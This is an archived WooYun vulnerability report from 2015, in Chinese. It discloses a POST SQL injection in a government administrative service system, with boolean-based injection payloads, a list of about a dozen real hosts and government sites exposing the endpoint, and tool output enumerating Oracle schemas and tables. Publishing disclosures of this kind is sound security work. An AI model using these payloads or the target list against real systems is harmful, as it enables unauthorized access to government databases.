{"id": 37051, "wybug_id": "wooyun-2015-0100544", "wybug_title": "某gov行政服务系统Oracle数据库搜索型POST注入", "wybug_corp": "深圳太极软件有限公司", "wybug_author": "路人甲", "wybug_date": "2015-03-10 18:33", "wybug_open_date": "2015-06-13 11:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向公众公开  简要描述： RT 详细说明：  排除该套系统其它注入点： WooYun: 某大型政府服务系统Oracle注入(使用量大)  WooYun: 某Gov行政中心系统Oracle注入漏洞(使用量大) 此处是一个POST注入，存在注入地方：spjggsQuery.do?method=busiinfoqueryPOST参数id存在注入\n\nwooyun还没人提交，抢先。。如图：\n\n按照通用程序标准（十个以上案例+演示），部分案例如下：http://119.1.108.246/spjggsQuery.do?method=busiinfoqueryhttp://jc.dlxg.gov.cn/spjggsQuery.do?method=busiinfoqueryhttp://202.97.172.24/spjggsQuery.do?method=busiinfoqueryhttp://www.tlsp.net/spjggsQuery.do?method=busiinfoqueryhttp://hxasc.cn/spjggsQuery.do?method=busiinfoqueryhttp://jc.dlxg.gov.cn/spjggsQuery.do?method=busiinfoqueryhttp://jjjc.sqxz.gov.cn/spjggsQuery.do?method=busiinfoqueryhttp://www.yjxzfw.com.cn/spjggsQuery.do?method=busiinfoqueryhttp://www15886.edu6.org/spjggsQuery.do?method=busiinfoqueryhttp://www.pjdzjc.gov.cn/spjggsQuery.do?method=busiinfoqueryhttp://58.42.229.238/spjggsQuery.do?method=busiinfoqueryhttp://61.189.156.73/spjggsQuery.do?method=busiinfoquery...暂时就先统计这么多。。。演示见漏洞证明   漏洞证明：  拿一个案例进行演示：http://119.1.108.246/spjggsQuery.do?method=busiinfoqueryPOST数据：\nid=61161&permname=&dwmc=\n访问正常，如图：\n\nPOST数据（条件为真）：\nid=61161' and 'a'<>'a&permname=&dwmc=\n访问正常：\n\nPOST数据（条件为假）：\nid=61161' and 'a'='a&permname=&dwmc=\n无数据：\n\n直接上工具：\n\n数据库：\n\n\n\n\navailable databases [27]:[*] CTXSYS[*] DATASWAP[*] DBSNMP[*] DMSYS[*] EXFSYS[*] HR[*] IX[*] JEECMS[*] MDSYS[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] QXN_TYSP[*] QXN_WEBHALL[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] TYSP[*] TYSP_SYSTEM[*] WEBHALL[*] WMSYS[*] XDB\n表信息：\nDatabase: WEBHALL[18 tables]+--------------------------+| T_DJL                    || T_WEBHALL_BGXZ           || T_WEBHALL_CJWD           || T_WEBHALL_FLFG           || T_WEBHALL_FLYJ           || T_WEBHALL_FRIEND_CONN    || T_WEBHALL_MENU           || T_WEBHALL_MENU_USERGROUP || T_WEBHALL_NEWS           || T_WEBHALL_NEWS_CONTENT   || T_WEBHALL_RESEARCH       || T_WEBHALL_SPMANAGER      || T_WEBHALL_TSPL           || T_WEBHALL_USER           || T_WEBHALL_USERGROUP      || T_WEBHALL_USER_USERGROUP || T_WEBHALL_ZRXX           || T_WEBHALL_ZRXX_REVERT    |+--------------------------+\n数据不跑了。。。   修复方案：  1、过滤2、WAF   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-03-15 11:34 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向网站管理单位（软件生产厂商）通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}